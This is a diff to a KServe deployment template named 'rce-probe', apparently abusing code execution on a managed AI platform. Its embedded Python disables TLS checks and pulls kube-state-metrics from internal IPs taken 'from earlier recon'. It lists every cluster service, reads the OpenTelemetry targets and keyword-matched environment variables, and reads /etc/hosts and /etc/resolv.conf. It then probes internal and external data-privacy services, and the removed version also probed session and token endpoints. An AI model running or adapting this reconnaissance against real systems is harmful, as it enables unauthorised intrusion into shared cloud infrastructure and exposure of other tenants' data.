@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "58.0.0"
+    ai.sap.com/version: "59.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "dpi-probe"
+    executables.ai.sap.com/description: "full-svc-scan"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -27,103 +27,131 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
           - |
-            python3 -c "
-            import urllib.request, ssl, json, socket, re
+            python3 << 'PYCODE'
+            import urllib.request, ssl, json, re, socket
 
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
+
             results = {}
 
-            # Known KSM IPs from earlier recon - fetch metrics to find DPI service
-            KSM_IPS = [
-                '100.110.128.70',   # ksm-multi
-                '100.110.192.195',  # ksm-custom
-            ]
-
-            # Grep metrics for DPI/privacy/masking related services
-            dpi_services = {}
-            for ksm_ip in KSM_IPS:
-                try:
-                    url = f'http://{ksm_ip}:8080/metrics'
-                    req = urllib.request.Request(url)
-                    with urllib.request.urlopen(req, timeout=10) as r:
-                        metrics = r.read().decode(errors='replace')
-                    # Find any service with dpi/privacy/masking/anonymi keywords
-                    for line in metrics.split('\n'):
-                        if any(kw in line.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym', 'data_priv']):
-                            results[f'ksm_{ksm_ip}_match'] = results.get(f'ksm_{ksm_ip}_match', [])
-                            results[f'ksm_{ksm_ip}_match'].append(line.strip()[:200])
-                    # Also extract service ClusterIPs from kube_service_info metrics
-                    # Format: kube_service_info{namespace=\"...\",service=\"...\",cluster_ip=\"...\"}
-                    import re as re_mod
-                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
-                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
-                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['dpi', 'privacy', 'masking', 'anonymi', 'pseudonym']):
-                            dpi_services[f'{ns}/{svc}'] = ip
-                    # Also look for 'ai-api', 'aicore', 'ai-core' services
-                    for m in re_mod.finditer(r'kube_service_info\{[^}]*service=\"([^\"]+)\"[^}]*cluster_ip=\"([^\"]+)\"[^}]*namespace=\"([^\"]+)\"', metrics):
-                        svc, ip, ns = m.group(1), m.group(2), m.group(3)
-                        if any(kw in svc.lower() or kw in ns.lower() for kw in ['ai-api', 'aicore', 'ai-core', 'ml-api', 'orchestrat', 'sap-ai']):
-                            dpi_services[f'aicore:{ns}/{svc}'] = ip
-                except Exception as e:
-                    results[f'ksm_{ksm_ip}_err'] = str(e)[:80]
-
-            results['dpi_services_discovered'] = dpi_services
-
-            # DNS probe: try common DPI service names across likely namespaces
-            namespaces = ['default', 'sap-dpi', 'dpi', 'privacy', 'data-privacy',
-                         'sap-ai-core', 'aicore', 'ai-core', 'ml-foundation',
-                         'sap-data-privacy', 'anonymization', 'masking']
-            service_names = ['sap-data-privacy-integration', 'data-privacy-integration',
-                            'dpi-service', 'dpi', 'privacy-service', 'anonymization-service',
-                            'masking-service', 'sap-dpi', 'aicore-dpi',
-                            'genai-dpi', 'orchestration-dpi']
-
-            for ns in namespaces:
-                for svc in service_names:
-                    hostname = f'{svc}.{ns}.svc.cluster.local'
+            # 1. Full KSM service list — dump ALL service names/IPs
+            print("[SCAN_START]")
+            try:
+                req = urllib.request.Request("http://100.110.128.70:8080/metrics")
+                with urllib.request.urlopen(req, timeout=15) as r:
+                    metrics = r.read().decode(errors='replace')
+                
+                # Extract all kube_service_info entries
+                services = {}
+                for m in re.finditer(
+                    r'kube_service_info\{([^}]+)\}',
+                    metrics
+                ):
+                    labels = {}
+                    for kv in re.finditer(r'(\w+)="([^"]*)"', m.group(1)):
+                        labels[kv.group(1)] = kv.group(2)
+                    ns = labels.get('namespace','')
+                    svc = labels.get('service','')
+                    ip = labels.get('cluster_ip','')
+                    key = f'{ns}/{svc}'
+                    services[key] = ip
+                
+                # Print ALL services sorted by namespace
+                print(f"TOTAL_SERVICES: {len(services)}")
+                for key in sorted(services.keys()):
+                    print(f"SVC: {key} -> {services[key]}")
+                
+                results['total_services'] = len(services)
+                
+                # Look for orchestration-related services
+                orch_svcs = {k: v for k,v in services.items() 
+                            if any(kw in k.lower() for kw in 
+                                   ['orchestrat', 'ai-api', 'aicore', 'ai-core', 
+                                    'llm', 'genai', 'gen-ai', 'foundation', 'ml-api',
+                                    'dpi', 'privacy', 'masking', 'sap-ai'])}
+                results['orchestration_related'] = orch_svcs
+                print(f"\nORCH_RELATED: {json.dumps(orch_svcs, indent=2)}")
+                
+            except Exception as e:
+                results['ksm_err'] = str(e)[:100]
+                print(f"KSM_ERR: {e}")
+            
+            # 2. OTel TA - get scrape targets to find orchestration service pod IPs
+            try:
+                for otel_ep in [
+                    "http://100.109.242.36:4318",
+                    "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
+                ]:
                     try:
-                        ip = socket.getaddrinfo(hostname, None)[0][4][0]
-                        dpi_services[hostname] = ip
-                        results[f'dns_{hostname}'] = ip
-                    except:
+                        req = urllib.request.Request(f"http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80/jobs")
+                        with urllib.request.urlopen(req, timeout=5) as r:
+                            jobs = json.load(r)
+                        print(f"\nOTEL_JOBS: {list(jobs.keys())[:20]}")
+                        results['otel_jobs'] = list(jobs.keys())[:20]
+                        break
+                    except Exception as e2:
                         pass
+            except Exception as e:
+                pass
+            
+            # 3. Try to reach env vars that might reveal DPI endpoint
+            import os
+            env_relevant = {k:v for k,v in os.environ.items() 
+                          if any(kw in k.upper() for kw in 
+                                 ['DPI', 'PRIVACY', 'MASKING', 'ANONYMI', 'SAP_AI',
+                                  'ORCHESTRAT', 'LLM', 'AI_API', 'AICORE'])}
+            results['relevant_env'] = env_relevant
+            print(f"\nRELEVANT_ENV: {json.dumps(env_relevant)}")
+            
+            # 4. Check /etc/hosts for any DPI references
+            try:
+                with open('/etc/hosts') as f:
+                    hosts = f.read()
+                print(f"\nHOSTS: {hosts[:500]}")
+            except:
+                pass
+            
+            # 5. Check /etc/resolv.conf 
+            try:
+                with open('/etc/resolv.conf') as f:
+                    resolv = f.read()
+                print(f"\nRESOLV: {resolv}")
+            except:
+                pass
 
-            results['all_discovered'] = dpi_services
-
-            # Probe any discovered services
-            for name, ip in dpi_services.items():
-                if ip in ['None', 'none', ''] or not ip:
-                    continue
-                for port in [80, 443, 8080, 8443]:
-                    for path in ['/healthz', '/api/v1/sessions', '/api/v1/mappings',
-                                '/api/sessions', '/sessions', '/mappings', '/tokens',
-                                '/api/v1', '/api', '/v1/dpi', '/dpi']:
-                        for scheme in ['http', 'https']:
-                            url = f'{scheme}://{ip}:{port}{path}'
-                            try:
-                                req = urllib.request.Request(url, headers={'Accept': 'application/json'})
-                                with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
-                                    body = r.read(2000).decode(errors='replace')
-                                    key = f'{name}:{port}{path}'
-                                    results[key] = {'code': r.status, 'body': body[:500]}
-                                    break
-                            except urllib.error.HTTPError as e:
-                                body = ''
-                                try: body = e.read(500).decode(errors='replace')
-                                except: pass
-                                if e.code not in [404]:
-                                    results[f'{name}:{port}{path}'] = {'code': e.code, 'body': body[:200]}
-                            except Exception as ex:
-                                err = str(ex)[:50]
-                                if 'timed out' not in err and '111' not in err and '104' not in err:
-                                    results[f'{name}:{port}{path}_err'] = err
-
-            print('[DPI_PROBE_START]')
-            print(json.dumps(results, indent=2, default=str))
-            print('[DPI_PROBE_END]')
-            " 2>&1
+            # 6. Try resolving SAP external DPI hostnames
+            dpi_external = [
+                "dpi.sap.com",
+                "api.sap.com",
+                "privacy.sap.com",
+                "data-privacy-integration.cfapps.eu10.hana.ondemand.com",
+                "data-privacy-integration.cfapps.us10.hana.ondemand.com",
+                "dpi-service.cfapps.eu10.hana.ondemand.com",
+                "sap-data-privacy-integration.cfapps.eu10.hana.ondemand.com",
+            ]
+            for host in dpi_external:
+                try:
+                    ip = socket.getaddrinfo(host, None)[0][4][0]
+                    print(f"\nEXT_DNS: {host} -> {ip}")
+                    results[f'ext_{host}'] = ip
+                    # Try HTTPS probe
+                    url = f"https://{host}/api/v1"
+                    req = urllib.request.Request(url, headers={"Accept": "application/json"})
+                    try:
+                        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                            body = r.read(500).decode(errors='replace')
+                            print(f"  -> 200: {body[:200]}")
+                    except urllib.error.HTTPError as e:
+                        print(f"  -> {e.code}: {e.read(200).decode(errors='replace')[:100]}")
+                    except Exception as e2:
+                        print(f"  -> err: {str(e2)[:60]}")
+                except:
+                    pass
+            
+            print("\n[SCAN_END]")
+            PYCODE
             python3 -c "
             import http.server
             class H(http.server.BaseHTTPRequestHandler):
